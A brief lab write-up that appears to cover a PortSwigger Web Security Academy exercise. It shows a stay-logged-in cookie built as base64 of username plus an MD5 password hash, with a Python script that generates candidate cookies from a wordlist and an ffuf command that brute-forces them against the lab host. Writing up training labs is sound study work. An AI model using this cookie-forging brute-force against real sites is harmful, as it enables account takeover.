# Brute-forcing a stay-logged-in cookie
[portsiwgger link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

# Lab description:

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. 

We can understand how the cookie is generated because Burp show us the first step in the inspector:

![image](https://github.com/user-attachments/assets/3b403a30-35ca-49b3-a4f6-f3fe782cbbf7)

then we can verify that is the encoded password with
```bash
echo -n peter | md5sum
```
so we reverse the process and we get the steps to genrate the token

username: + MD5 hash of the password
and then encoded in Base64

generate the cookie list with pyhon:

```python
import hashlib
import base64

prefix = "carlos:"
with open("input.txt", "r") as file:
    for word in file:
        word = word.strip()  # Remove newline
        md5_hash = hashlib.md5(word.encode()).hexdigest()
        result = prefix + md5_hash
        base64_encoded = base64.b64encode(result.encode()).decode()
        print(base64_encoded)
```

and then use ffuf to fuzz the codes
```bash
ffuf -w tokens.txt -u "https://0a5e00200487c7fb81b1c634004a0066.web-security-academy.net/my-account?id=carlos" -b "stay-logged-in=FUZZ" -ac
```
we can use the cookie to login or revert the process and get the password.
